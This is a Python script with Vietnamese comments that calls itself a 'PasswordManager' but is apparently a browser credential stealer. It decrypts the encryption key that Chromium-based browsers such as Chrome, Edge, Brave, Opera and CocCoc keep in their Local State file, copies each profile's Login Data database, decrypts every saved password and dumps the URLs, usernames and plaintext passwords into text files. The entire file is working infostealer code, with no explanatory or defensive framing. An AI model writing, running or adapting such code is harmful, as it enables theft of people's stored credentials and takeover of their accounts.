import os
import shutil
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES

class PasswordManager:
    def __init__(self, browsers, output_folder="BrowserPasswords"):
        self.browsers = browsers
        self.output_folder = output_folder
        self.key = None

    def get_encryption_key(self, browser_name):
        if browser_name in ['Mozilla/Firefox', 'Safari']:
            return None
        
        local_state_path = os.path.join(os.environ['LOCALAPPDATA'], browser_name, 'User Data', 'Local State')
        if not os.path.exists(local_state_path):
            raise FileNotFoundError(f"Local State file not found for {browser_name}")

        with open(local_state_path, 'r', encoding='utf-8') as file:
            local_state = json.load(file)

        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]  # Giải mã khóa mã hóa

    def decrypt_password(self, ciphertext):
        try:
            iv = ciphertext[3:15]
            payload = ciphertext[15:]
            cipher = AES.new(self.key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception as e:
            print(f"Error decrypting password: {e}")
            return ""

    def extract_passwords(self, browser_name):
        self.key = self.get_encryption_key(browser_name)
        data = []

        # Xử lý thư mục 'User Data' để lấy tất cả profile
        user_data_path = os.path.join(os.environ['LOCALAPPDATA'], browser_name, 'User Data')
        for profile_dir in os.listdir(user_data_path):
            if os.path.isdir(os.path.join(user_data_path, profile_dir)):
                db_path = os.path.join(user_data_path, profile_dir, 'Login Data')
                if os.path.exists(db_path):
                    temp_db_path = f"{browser_name.replace('/', '_')}_{profile_dir}_passwords.db"
                    shutil.copyfile(db_path, temp_db_path)

                    db = sqlite3.connect(temp_db_path)
                    cursor = db.cursor()

                    cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        origin_url, action_url, username, encrypted_password = row
                        decrypted_password = self.decrypt_password(encrypted_password)
                        if username or decrypted_password:
                            data.append({
                                'browser': browser_name,
                                'profile': profile_dir,
                                'origin_url': origin_url,
                                'action_url': action_url,
                                'username': username,
                                'password': decrypted_password
                            })

                    cursor.close()
                    db.close()
                    os.remove(temp_db_path)

        return data

    @staticmethod
    def save_data_to_file(data, folder, filename):
        os.makedirs(folder, exist_ok=True)
        file_path = os.path.join(folder, filename)
        
        with open(file_path, 'w', encoding='utf-8') as file:
            # Ghi tiêu đề cột
            file.write(f"{'Website':<60} | {'Username':<30} | {'Password':<30} | {'Profile':<20}\n")
            file.write("=" * 140 + "\n")  # Kẻ đường dưới tiêu đề
            
            # Ghi từng dòng dữ liệu
            for entry in data:
                website = entry['origin_url']
                username = entry.get('username', 'N/A')  # Nếu không có username, ghi 'N/A'
                password = entry.get('password', 'N/A')  # Nếu không có password, ghi 'N/A'
                profile = entry.get('profile', 'Default')  # Nếu không có profile, ghi 'Default'
                
                # Ghi dữ liệu với định dạng bảng
                file.write(f"{website:<60} | {username:<30} | {password:<30} | {profile:<20}\n")
            
            file.write("=" * 140 + "\n")  # Kẻ đường cuối cùng

    def collect_passwords(self):
        os.makedirs(self.output_folder, exist_ok=True)

        for browser_name in self.browsers:
            try:
                passwords = self.extract_passwords(browser_name)
                if passwords:
                    filename = f"{browser_name.replace('/', '_')}_passwords.txt"
                    self.save_data_to_file(passwords, self.output_folder, filename)
            except Exception as e:
                print(f"Error processing {browser_name}: {e}")

def main():
    browsers = [
        'Google/Chrome',
        'CocCoc/Browser',
        'Microsoft/Edge',
        'Opera/Opera',
        'BraveSoftware/Brave-Browser',
        'Vivaldi/Application',
        'Epic Privacy Browser',
        'Comodo/Dragon',
        'Mozilla/Firefox',
        'Safari'
    ]

    manager = PasswordManager(browsers)
    manager.collect_passwords()

    print("Passwords have been collected and saved.")

if __name__ == "__main__":
    main()
